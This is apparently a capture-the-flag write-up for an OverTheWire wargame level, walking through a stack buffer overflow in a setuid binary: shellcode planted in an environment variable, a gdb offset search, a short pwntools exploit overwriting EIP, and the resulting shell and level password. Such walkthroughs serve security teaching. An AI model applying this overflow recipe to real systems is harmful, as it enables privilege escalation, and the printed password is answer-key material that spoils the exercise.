# Manpage Level 1 → 2

## Goal

Structurally identical to [level 0 → 1](level00.md): `manpage1` takes user input, builds a command line, and calls `execv()` without checking the length — so an overlong input smashes the stack and overwrites the return address. You point EIP into a NOP sled + shellcode in an env var and get a `manpage2` shell.

## Concepts you'll learn

- Reinforcement of the env-var + overflow + return-to-shellcode recipe
- That `signal(SIGTERM, SIG_IGN)` in the vulnerable program doesn't protect against control-flow hijacking — it only ignores `kill -TERM`, not the fact that you've rewritten EIP
- When a level is mechanically similar to the previous one, the solve is fast

## Walkthrough

### 1. Plant shellcode in an env var

Same technique as level 0. If your previous `EGG` is still exported, you can reuse it; otherwise:

```bash
$ export EGG=$(cat sc.bin)
$ /tmp/getenv EGG /manpage/manpage1
EGG = 0xffffd549
```

Note: the `EGG` address will differ slightly from level 0 because the argv/environ layout of `manpage1` is different. Re-derive it.

### 2. Find the offset

As always:

```bash
$ gdb -q /manpage/manpage1
(gdb) r $(python3 -c 'from pwn import *; sys.stdout.buffer.write(cyclic(400))')
# crash
(gdb) i r eip
```

avishai reports the offset is the same **260** bytes for this level.

### 3. Build and run

```python
# exploit1.py
from pwn import *
SHELLCODE_ADDR = 0xffffd549   # re-derive per run
sys.stdout.buffer.write(b"A"*260 + p32(SHELLCODE_ADDR))
```

```bash
$ (python3 exploit1.py; cat) | /manpage/manpage1
$ whoami
manpage2
$ cat /etc/manpage_pass/manpage2
s8gSofSE2b
```

## The answer

The password for `manpage2` is:

**`s8gSofSE2b`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/manpage/manpage1.html>
